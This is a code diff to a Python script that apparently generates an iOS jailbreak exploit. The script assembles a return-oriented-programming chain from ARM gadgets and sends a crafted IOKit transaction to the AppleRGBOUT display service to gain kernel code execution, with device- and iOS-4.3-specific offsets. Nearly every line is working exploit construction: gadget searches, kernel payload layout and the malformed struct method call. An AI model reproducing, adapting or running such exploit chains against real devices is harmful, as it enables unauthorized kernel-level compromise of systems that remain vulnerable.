@@ -20,6 +20,11 @@ PROT_EXEC = 4
 mode, device, version, cachefile, kernfile, patchfile, kcode, outfile = sys.argv[1:9]
 four_dot_three = '4.3' in version
 
+if four_dot_three:
+    memcpy = '_memcpy$VARIANT$CortexA' + ('9' if device.startswith('iPad2') else '8')
+else:
+    memcpy = '_memcpy'
+
 assert mode in ['dejavu', 'untether']
 patchfp = open(patchfile)
 
@@ -29,14 +34,18 @@ def add_lib(conn, short, path):
     lib_paths.add(path)
 
 debugging = True
+result_for = None
 
 def dbg_result():
+    global result_for
     if debugging:
+        if result_for is None:
+            result_for = ptr('Result for %s was %08x\n', True)
         result, resultp = stackunkpair()
         store_r0_to(resultp)
         back = sys._getframe().f_back
 
-        funcall('_fprintf', dmini.cur.sym('___stderrp'), ptr('Result for %s:%d was %%08x\n' % (back.f_code.co_filename, back.f_lineno), True), result, load_r0=True)
+        funcall('_fprintf', dmini.cur.sym('___stderrp'), result_for, ptr('%s:%d' % (back.f_code.co_filename, back.f_lineno), True), result, load_r0=True)
 
 dmini.init(kernfile, False)
 
@@ -59,14 +68,10 @@ while True:
 weirdfile = pointed(weirdfile + I(sysent, count) + stuff)
 
 def mov_r0_r6():
-    set_fwd('PC', dmini.cur.find('+ 30 46 70 bd'))
-    exhaust_fwd('R4', 'R5', 'R6')
-    heapadd(fwd('R4'), fwd('R5'), fwd('R6'), fwd('PC'))
+    gadget(PC='+ 30 46 70 bd', a='R4, R5, R6, PC')
 
 def str_r7_sp_856():
-    set_fwd('PC', dmini.cur.find('+ d6 97 e9 bd'))
-    exhaust_fwd('R0', 'R3', 'R5', 'R6', 'R7')
-    heapadd(fwd('R0'), fwd('R3'), fwd('R5'), fwd('R6'), fwd('R7'), fwd('PC'))
+    gadget(PC='+ d6 97 e9 bd', a='R0, R3, R5, R6, R7, PC')
 
 def seek_kernel_ldm(reg):
     s = chr(0x90 | reg) + chr(0xe8)
@@ -81,16 +86,16 @@ def seek_kernel_ldm(reg):
             if (i & 3) != 2: continue
             insn, = struct.unpack('I', data[i-2:i+2])
             regs = [b for (n, b) in enumerate(['R0', 'R1', 'R2', 'R3', 'R4', 'R5', 'R6', 'R7', 'R8', 'R9', 'R10', 'R11', 'R12', 'SP', 'LR', 'PC']) if (insn & (1 << n))]
-            if 'SP' not in regs or 'PC' not in regs: continue
-            if 'R0' in regs or 'R7' in regs: continue
+            if 'SP' not in regs or 'PC' not in regs or 'LR' not in regs: continue
+            if 'R0' in regs or 'R6' in regs or 'R7' in regs: continue
             # got it
             return (dmini.cur.nth_segment(seg).start + i - 2, regs)
         
         seg += 1
 
 
-# 12_41, 31_41, 31_421: R6
-kernel_ldm, kernel_ldm_regs = seek_kernel_ldm(11 if four_dot_three else 6)
+# 12_41, 31_41, 31_421: R6, no I lied
+kernel_ldm, kernel_ldm_regs = seek_kernel_ldm(11 if four_dot_three else 2)
 #kernel_ldm = 0xdeadbeef
 init(*kernel_ldm_regs)
 
@@ -100,6 +105,12 @@ obj = code_addr - 4
 m = pointed('')
 set_fwd('SP', pointer(m))
 heapadd(m)
+
+# mov pc, r9
+set_fwd('PC', dmini.cur.find('- 1e ff 2f e1 1e ff 2f e1'))
+goo.fwds['PC'] = goo.fwds['LR']
+del goo.fwds['LR']
+
 mov_r0_r6()
 store_r0_to(obj)
 str_r7_sp_856()
@@ -111,8 +122,8 @@ set_fwd('R4', obj)
 set_fwd('PC', code_addr)
 
 
-kstuff = finalize(None, must_be_simple=False, should_heapdump=False)
-kstuff += '\0'*(856 + 0x38 + 4 - len(kstuff)) # xxx offset
+kstuff = finalize(None, must_be_simple=False, should_heapdump=True); 
+kstuff.append('\0'*1024)
 
 def set_cache(cachefile):
     conn = dmini.Connection(cachefile, True)
@@ -159,10 +170,18 @@ def do_main_thing():
     funcall('_mach_task_self')
     store_r0_to(task_self_p)
 
-    set_r0_to(kstuffp); dbg_result()
+    if not four_dot_three:
+        funcall(memcpy, kstuffp, real_kstuffp, fake_kstuff_len)
+
+    #funcall(memcpy, kstuffp, ptrI(0xdeadbeef, pointer(m), 0, 0, 0, 0, 0, 0x80002000, 0xdeadbeef, 0xdeadbee0), fake_kstuff_len)
+
+    if debugging:
+        set_r0_to(kstuffp); dbg_result()
 
     # The manpage says this returns EINVAL, but in fact the kernel handles it.
-    funcall('_mlock', kstuffp, len(kstuff)); dbg_result()
+    funcall('_mlock', kstuffp, len(kstuff) if four_dot_three else (16 + fake_kstuff_len + len(kstuff))); dbg_result()
+
+    #funcall('_fprintf', dmini.cur.sym('___stderrp'), ptr('Opening %s\n', True), AppleRGBOUT, load_r0=True)
 
     funcall('iokit._IOServiceMatching', AppleRGBOUT)
     store_r0_to(matchingp)
@@ -172,7 +191,6 @@ def do_main_thing():
         funcall('iokit._IOServiceOpen', None, task_self, 0, connect); dbg_result()
     else:
         # http://www.opensource.apple.com/source/IOKitUser/IOKitUser-502/FireWireTest.cpp?txt
-        #itp = ptrI(0) # XXX this is just for testing
         portp = ptrI(0)
         funcall('_mach_task_self')
         funcall('_mach_port_allocate', None, 1, portp); dbg_result()
@@ -205,8 +223,6 @@ def do_main_thing():
 
     funcall('iokit._IOConnectCallStructMethod', connect, 5, transactionp, len(transaction), 0, 0, load_r0=True); dbg_result()
     #funcall('_sleep', 1000)
-    #dbg_result(); funcall('_abort')
-
 
     # do some housekeeping
     # (but don't bother if we're going to exec)
@@ -241,20 +257,26 @@ if mode == 'untether':
 elif mode == 'dejavu':
     init('R4', 'R5', 'PC')
 
-kstuffp = ptr(kstuff + '\0'*32)
+if four_dot_three:
+    kstuffp = ptr(kstuff)
+else:
+    fake_kstuff_len = 4 * len(kernel_ldm_regs)
+    kstuffp = ptr('\0' * fake_kstuff_len, align=8, align_offset=6)
+    real_kstuffp = ptr(kstuff)
 zerop = ptrI(0)
-AppleRGBOUT = ptr('AppleM2TVOut' if device in ['iPhone2,1', 'iPod3,1'] else 'AppleRGBOUT', True)
+AppleRGBOUT = ptr('AppleM2CLCD' if device in ['iPhone2,1', 'iPod3,1'] else 'AppleRGBOUT', True) # if four_dot_three else 'AppleCLCD', True)
 connect = ptrI(0)
 fail_callback = ptrI(dmini.cur.sym('_getpid'), 0xeeeeeeee)
 
 transaction = troll_string('\x00' * (0xd8 if four_dot_three else 0x8c))
 transaction[0:4] = transaction[4:8] = I(0xeeeeeeee)
-transaction[8:0xc] = I(kstuffp) # surface saved in r11
 transaction[0x58:0x5c] = I(kernel_ldm)
 if four_dot_three:
     transaction[0xb8:0xbc] = I(6) # run iterations 1 and 2 (first loop bails at 1)
+    transaction[8:0xc] = I(kstuffp) # surface saved in r11
 else:
-    transaction[0x70:0x74] = I(6)
+    transaction[0x70:0x74] = I(kstuffp) # overlapping the address and "6"
+    transaction[8:0xc] = I(0xdeadbeef) # no idea
 transaction = simplify(transaction)
 transactionp = ptr(transaction)
 if mode == 'dejavu':
@@ -291,6 +313,6 @@ else:
     init_sp = 0x10031000
     address = 0x8000
 
-    final = finalize(address)
-    #heapdump(final)
+    final = finalize(address, should_heapdump=True)
     open(outfile, 'w').write(pickle.dumps({'segment': final, 'initializer': initializer, 'init_sp': init_sp, 'rop_address': address, 'libs': lib_paths, 'dylib': False}))
+
